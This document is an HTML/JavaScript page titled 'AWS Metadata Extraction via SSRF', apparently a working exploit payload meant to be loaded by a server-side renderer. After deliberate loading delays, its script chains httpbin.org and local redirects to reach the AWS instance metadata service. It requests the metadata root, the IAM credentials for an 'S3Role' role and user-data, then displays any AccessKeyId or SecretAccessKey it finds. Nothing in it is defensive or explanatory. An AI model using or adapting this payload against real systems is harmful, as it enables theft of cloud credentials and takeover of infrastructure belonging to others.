<!DOCTYPE html>
<html>
<head>
    <title>AWS Metadata Loader</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            margin: 20px;
            background: #f5f5f5;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .result-section {
            border: 3px solid #333;
            margin: 20px 0;
            padding: 20px;
            background: #ffffff;
            min-height: 200px;
        }
        .aws-credentials {
            background: #ff4444 !important;
            color: white;
            border: 5px solid #cc0000 !important;
            font-size: 18px;
            font-weight: bold;
            text-align: center;
        }
        .success-response {
            background: #44ff44 !important;
            border-color: #00aa00 !important;
        }
        .loading-text {
            color: #666;
            font-style: italic;
        }
        pre {
            background: #f9f9f9;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            white-space: pre-wrap;
            word-wrap: break-word;
            font-size: 12px;
            max-height: 400px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸ¯ AWS Metadata Extraction via SSRF</h1>
        <p><strong>Status:</strong> <span id="global-status">Initializing metadata extraction...</span></p>
        <p><strong>Progress:</strong> <span id="progress">0/4 tests completed</span></p>
        
        <div class="result-section" id="section1">
            <h2>ğŸ” Test 1: AWS Metadata Service v1.0 Root</h2>
            <p class="loading-text" id="status1">â³ Preparing request...</p>
            <div id="content1">Waiting for execution...</div>
        </div>
        
        <div class="result-section" id="section2">
            <h2>ğŸ”‘ Test 2: IAM S3Role Credentials (v1.0)</h2>
            <p class="loading-text" id="status2">â³ Preparing request...</p>
            <div id="content2">Waiting for execution...</div>
        </div>
        
        <div class="result-section" id="section3">
            <h2>ğŸ“„ Test 3: AWS User Data</h2>
            <p class="loading-text" id="status3">â³ Preparing request...</p>
            <div id="content3">Waiting for execution...</div>
        </div>
        
        <div class="result-section" id="section4">
            <h2>ğŸ•°ï¸ Test 4: Legacy API (2007-01-19)</h2>
            <p class="loading-text" id="status4">â³ Preparing request...</p>
            <div id="content4">Waiting for execution...</div>
        </div>
        
        <div class="result-section" id="summary-section">
            <h2>ğŸ“Š EXECUTION SUMMARY</h2>
            <div id="summary">Tests will begin shortly...</div>
        </div>
    </div>
    
    <!-- Force loading delay with external resource -->
    <iframe src="data:text/html;charset=utf-8,<html><body><script>setTimeout(function(){parent.startTests();}, 8000);</script><h3>Loading external resources...</h3></body></html>" 
            width="1" height="1" style="visibility:hidden;"></iframe>
    
    <script>
        var testsCompleted = 0;
        var totalTests = 4;
        var allResults = [];
        var testStarted = false;
        
        // Fallback to start tests if iframe doesn't work
        setTimeout(function() {
            if (!testStarted) {
                startTests();
            }
        }, 10000);
        
        function startTests() {
            if (testStarted) return;
            testStarted = true;
            
            document.getElementById('global-status').textContent = 'Executing AWS metadata requests...';
            
            // Test 1: AWS Metadata v1.0 root
            setTimeout(function() {
                executeTest(
                    'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/',
                    1,
                    'AWS Metadata v1.0 Root Directory'
                );
            }, 2000);
            
            // Test 2: S3Role credentials
            setTimeout(function() {
                executeTest(
                    'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role',
                    2,
                    'S3Role IAM Credentials'
                );
            }, 6000);
            
            // Test 3: User data
            setTimeout(function() {
                executeTest(
                    'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/1.0/user-data',
                    3,
                    'AWS User Data'
                );
            }, 10000);
            
            // Test 4: Legacy API
            setTimeout(function() {
                executeTest(
                    'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/iam/security-credentials/S3Role',
                    4,
                    'Legacy API S3Role'
                );
            }, 14000);
            
            // Generate final summary
            setTimeout(function() {
                generateFinalSummary();
            }, 20000);
        }
        
        function executeTest(url, testNumber, testName) {
            document.getElementById('status' + testNumber).innerHTML = 'ğŸ”„ Executing request...';
            
            try {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', url, false);
                xhr.send();
                
                var response = xhr.responseText;
                var result = {
                    testNumber: testNumber,
                    testName: testName,
                    url: url,
                    response: response,
                    hasCredentials: response.includes('AccessKeyId') || response.includes('SecretAccessKey'),
                    success: response.length > 10
                };
                
                allResults.push(result);
                testsCompleted++;
                
                // Update UI
                var statusEl = document.getElementById('status' + testNumber);
                var contentEl = document.getElementById('content' + testNumber);
                var sectionEl = document.getElementById('section' + testNumber);
                
                if (result.hasCredentials) {
                    statusEl.innerHTML = 'ğŸ‰ğŸ‰ğŸ‰ AWS CREDENTIALS DETECTED! ğŸ‰ğŸ‰ğŸ‰';
                    sectionEl.className += ' aws-credentials';
                } else if (result.success) {
                    statusEl.innerHTML = 'âœ… Request successful (' + response.length + ' bytes)';
                    sectionEl.className += ' success-response';
                } else {
                    statusEl.innerHTML = 'âŒ No significant response';
                }
                
                contentEl.innerHTML = 
                    '<strong>URL:</strong> ' + url + '<br><br>' +
                    '<strong>Response Length:</strong> ' + response.length + ' bytes<br><br>' +
                    '<strong>Content:</strong><br>' +
                    '<pre>' + response + '</pre>';
                
                document.getElementById('progress').textContent = testsCompleted + '/' + totalTests + ' tests completed';
                
            } catch (e) {
                allResults.push({
                    testNumber: testNumber,
                    testName: testName,
                    url: url,
                    response: 'ERROR: ' + e.message,
                    hasCredentials: false,
                    success: false
                });
                
                document.getElementById('status' + testNumber).innerHTML = 'âŒ Error: ' + e.message;
                document.getElementById('content' + testNumber).innerHTML = 'Request failed: ' + e.message;
                testsCompleted++;
                document.getElementById('progress').textContent = testsCompleted + '/' + totalTests + ' tests completed';
            }
        }
        
        function generateFinalSummary() {
            document.getElementById('global-status').textContent = 'All tests completed';
            
            var credentialTests = allResults.filter(r => r.hasCredentials);
            var successfulTests = allResults.filter(r => r.success);
            
            var summary = '<h3>ğŸ¯ Final Results</h3>';
            summary += '<p><strong>Total Tests:</strong> ' + allResults.length + '</p>';
            summary += '<p><strong>Successful Responses:</strong> ' + successfulTests.length + '</p>';
            summary += '<p><strong>Credential Detections:</strong> ' + credentialTests.length + '</p>';
            
            if (credentialTests.length > 0) {
                summary += '<div style="background:#ff0000;color:white;padding:25px;margin:20px 0;border:5px solid #000;text-align:center;font-size:20px;">';
                summary += 'ğŸš¨ğŸš¨ğŸš¨ AWS CREDENTIALS FOUND! ğŸš¨ğŸš¨ğŸš¨<br>';
                summary += 'Check Test(s): ' + credentialTests.map(t => t.testNumber).join(', ');
                summary += '</div>';
            }
            
            summary += '<h4>ğŸ“‹ Test Details:</h4>';
            allResults.forEach(function(result) {
                summary += '<p><strong>Test ' + result.testNumber + ' (' + result.testName + '):</strong> ';
                if (result.hasCredentials) {
                    summary += 'ğŸ‰ CREDENTIALS FOUND!';
                } else if (result.success) {
                    summary += 'âœ… ' + result.response.length + ' bytes received';
                } else {
                    summary += 'âŒ Failed or empty';
                }
                summary += '</p>';
            });
            
            document.getElementById('summary').innerHTML = summary;
        }
        
        // Initial status
        document.getElementById('global-status').textContent = 'Waiting for resource loading...';
    </script>
</body>
</html>
